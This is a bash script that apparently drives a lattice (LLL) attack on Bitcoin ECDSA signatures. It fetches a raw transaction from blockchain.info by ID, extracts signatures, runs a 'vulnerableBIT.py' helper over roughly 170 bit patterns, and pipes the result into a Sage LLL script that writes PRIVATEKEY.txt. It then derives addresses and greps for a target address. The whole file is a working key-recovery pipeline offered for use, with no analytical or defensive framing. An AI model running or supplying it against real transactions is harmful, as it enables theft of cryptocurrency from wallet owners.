#!/bin/bash
fileid="$1"
grepid="$2"
wget -qO- https://blockchain.info/rawtx/${fileid}?format=hex > rawtx.json
python3 signCapture.py
chmod +x signScript.sh
sed -i -e 's/\r$//' signScript.sh
./signScript.sh
python3 vulnerableBIT.py 0000010001111100
python3 vulnerableBIT.py 0000010010011100
python3 vulnerableBIT.py 0000010111000010
python3 vulnerableBIT.py 0000011111011000
python3 vulnerableBIT.py 0000011111111111
python3 vulnerableBIT.py 0000100000000000
python3 vulnerableBIT.py 0000100010000011
python3 vulnerableBIT.py 0000100100111000
python3 vulnerableBIT.py 0000101100000100
python3 vulnerableBIT.py 0000101100100111
python3 vulnerableBIT.py 0000101101010110
python3 vulnerableBIT.py 0000110000001001
python3 vulnerableBIT.py 0000110110001111
python3 vulnerableBIT.py 0000111111111010
python3 vulnerableBIT.py 0001000001010010
python3 vulnerableBIT.py 0001000001011010
python3 vulnerableBIT.py 0001000111011001
python3 vulnerableBIT.py 0001001101100010
python3 vulnerableBIT.py 0001010011111000
python3 vulnerableBIT.py 0001011010110100
python3 vulnerableBIT.py 0001011011000011
python3 vulnerableBIT.py 0001011011111111
python3 vulnerableBIT.py 0001011100111000
python3 vulnerableBIT.py 0001100100111011
python3 vulnerableBIT.py 0001100110111011
python3 vulnerableBIT.py 0001101101101010
python3 vulnerableBIT.py 0001101110010010
python3 vulnerableBIT.py 0001101110101001
python3 vulnerableBIT.py 0001101111010110
python3 vulnerableBIT.py 0001110100001001
python3 vulnerableBIT.py 0001110100100010
python3 vulnerableBIT.py 0001110110011000
python3 vulnerableBIT.py 0001110110111001
python3 vulnerableBIT.py 1011010011010101
python3 vulnerableBIT.py 1011010101001101
python3 vulnerableBIT.py 0001111010000110
python3 vulnerableBIT.py 0001111110000101
python3 vulnerableBIT.py 0001111111001001
python3 vulnerableBIT.py 0010000011111110
python3 vulnerableBIT.py 0010001101111011
python3 vulnerableBIT.py 0010001110110011
python3 vulnerableBIT.py 0010010000110100
python3 vulnerableBIT.py 0010010010110001
python3 vulnerableBIT.py 0010010110111110
python3 vulnerableBIT.py 0010011100101000
python3 vulnerableBIT.py 0010011101010111
python3 vulnerableBIT.py 0010100010100110
python3 vulnerableBIT.py 0010100011110001
python3 vulnerableBIT.py 0010100111000001
python3 vulnerableBIT.py 0010100111110000
python3 vulnerableBIT.py 0010101111100110
python3 vulnerableBIT.py 0010110011000011
python3 vulnerableBIT.py 0010110101000100
python3 vulnerableBIT.py 0010110101110101
python3 vulnerableBIT.py 0010111100000111
python3 vulnerableBIT.py 0010111110001111
python3 vulnerableBIT.py 0011000000010000
python3 vulnerableBIT.py 0011000001111101
python3 vulnerableBIT.py 0011000111001100
python3 vulnerableBIT.py 0011000111101010
python3 vulnerableBIT.py 0011001011000010
python3 vulnerableBIT.py 0011001011100111
python3 vulnerableBIT.py 0011010000101110
python3 vulnerableBIT.py 0011010100000101
python3 vulnerableBIT.py 0011010111001100
python3 vulnerableBIT.py 0011010111001110
python3 vulnerableBIT.py 0011011100101000
python3 vulnerableBIT.py 0011011110111101
python3 vulnerableBIT.py 0011011111011011
python3 vulnerableBIT.py 0011011111101101
python3 vulnerableBIT.py 0011100010001001
python3 vulnerableBIT.py 0011100100010100
python3 vulnerableBIT.py 0011100101101001
python3 vulnerableBIT.py 0011100111100101
python3 vulnerableBIT.py 0011110000111100
python3 vulnerableBIT.py 0011110010011000
python3 vulnerableBIT.py 0011110100000001
python3 vulnerableBIT.py 0011111001001011
python3 vulnerableBIT.py 0011111001011011
python3 vulnerableBIT.py 0011111011010100
python3 vulnerableBIT.py 0011111110100011
python3 vulnerableBIT.py 0011111111110101
python3 vulnerableBIT.py 0100000011110111
python3 vulnerableBIT.py 0100001010010001
python3 vulnerableBIT.py 0100010101011101
python3 vulnerableBIT.py 0100010110010101
python3 vulnerableBIT.py 0100010110101000
python3 vulnerableBIT.py 0100011100001000
python3 vulnerableBIT.py 0100011111000001
python3 vulnerableBIT.py 0100100011000111
python3 vulnerableBIT.py 0100101011001001
python3 vulnerableBIT.py 0100101111110011
python3 vulnerableBIT.py 0100110100110101
python3 vulnerableBIT.py 0100111101111011
python3 vulnerableBIT.py 1011010111110111
python3 vulnerableBIT.py 1011011000101110
python3 vulnerableBIT.py 1011011000110100
python3 vulnerableBIT.py 1011100010010001
python3 vulnerableBIT.py 1011100010111011
python3 vulnerableBIT.py 1011100111010111
python3 vulnerableBIT.py 1011110010000110
python3 vulnerableBIT.py 1011110011001111
python3 vulnerableBIT.py 1011111101110100
python3 vulnerableBIT.py 1100000000100100
python3 vulnerableBIT.py 1100000000111011
python3 vulnerableBIT.py 1100000001100101
python3 vulnerableBIT.py 1100000010111111
python3 vulnerableBIT.py 1100000111001010
python3 vulnerableBIT.py 1100001011001101
python3 vulnerableBIT.py 1100001100000010
python3 vulnerableBIT.py 1100010100001101
python3 vulnerableBIT.py 1100010100010100
python3 vulnerableBIT.py 1100010100100000
python3 vulnerableBIT.py 1100011011011111
python3 vulnerableBIT.py 1100011100010111
python3 vulnerableBIT.py 1100100101111000
python3 vulnerableBIT.py 1100100111011101
python3 vulnerableBIT.py 1100100111100111
python3 vulnerableBIT.py 1100110000111111
python3 vulnerableBIT.py 1100110001011101
python3 vulnerableBIT.py 1100110101101010
python3 vulnerableBIT.py 1100111000000000
python3 vulnerableBIT.py 1100111001100100
python3 vulnerableBIT.py 1101000110110101
python3 vulnerableBIT.py 1101001000100100
python3 vulnerableBIT.py 1101001001011001
python3 vulnerableBIT.py 1101001110111001
python3 vulnerableBIT.py 1101001111101000
python3 vulnerableBIT.py 1101010000101110
python3 vulnerableBIT.py 1101010001111101
python3 vulnerableBIT.py 1101100001011111
python3 vulnerableBIT.py 1101101101010101
python3 vulnerableBIT.py 1101110010100101
python3 vulnerableBIT.py 1101110011110100
python3 vulnerableBIT.py 1101111101001011
python3 vulnerableBIT.py 1101111101011000
python3 vulnerableBIT.py 1101111110001101
python3 vulnerableBIT.py 1110000000101010
python3 vulnerableBIT.py 1110000100111100
python3 vulnerableBIT.py 1110000111010000
python3 vulnerableBIT.py 1110001000001100
python3 vulnerableBIT.py 1110001000100010
python3 vulnerableBIT.py 1110010010000111
python3 vulnerableBIT.py 1110010010101011
python3 vulnerableBIT.py 1110010110100110
python3 vulnerableBIT.py 1110011010000101
python3 vulnerableBIT.py 1110100000000101
python3 vulnerableBIT.py 1110101010001011
python3 vulnerableBIT.py 1111000110110101
python3 vulnerableBIT.py 1111000111101101
python3 vulnerableBIT.py 1111001001001010
python3 vulnerableBIT.py 1111001101100000
python3 vulnerableBIT.py 1111001110101101
python3 vulnerableBIT.py 1111010011000110
python3 vulnerableBIT.py 1111011011011010
python3 vulnerableBIT.py 1111101001101100
python3 vulnerableBIT.py 1111101011111100
python3 vulnerableBIT.py 1111110010001000
python3 vulnerableBIT.py 1111110010111010
python3 vulnerableBIT.py 1111110110011100
python3 vulnerableBIT.py 1111111000110001
python3 vulnerableBIT.py 1111111101101111
python3 vulnerableBIT.py 1111111111111101
sage -python3 algorithmLLL.py SIGNATURES.csv 249 256 > PRIVATEKEY.txt
sed -i 's/Setting permissions of DOT_SAGE directory so only you can read and write it./0000000000000000000000000000000000000000000000000000000000000000/g' PRIVATEKEY.txt
python3 privtoaddr1.py
python3 privtoaddr2.py
grep "${grepid}" ADDRESS.txt



